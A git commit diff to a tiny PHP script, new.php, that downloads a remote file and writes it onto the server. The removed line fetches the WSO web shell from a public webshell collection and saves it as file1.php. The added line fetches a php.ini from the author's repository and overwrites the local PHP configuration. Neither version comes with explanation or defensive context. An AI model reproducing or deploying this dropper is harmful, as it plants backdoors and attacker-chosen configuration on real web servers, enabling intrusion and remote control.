76061998c154f2dd328b1bbc630c3be76cedf40a
سلمان الحربي <dolar1416@gmail.com>
2017-05-25 22:03:40 +0300

    Update new.php

--- new.php
+++ new.php
@@ -1,4 +1,4 @@
 <?php
-$file = file_get_contents('https://raw.githubusercontent.com/tennc/webshell/master/php/wso/WSO_base64.php');
-file_put_contents('file1.php', $file);
+$file = file_get_contents('https://raw.githubusercontent.com/Salman-Al7rbi/test/master/php.ini');
+file_put_contents('php.ini', $file);
 ?>
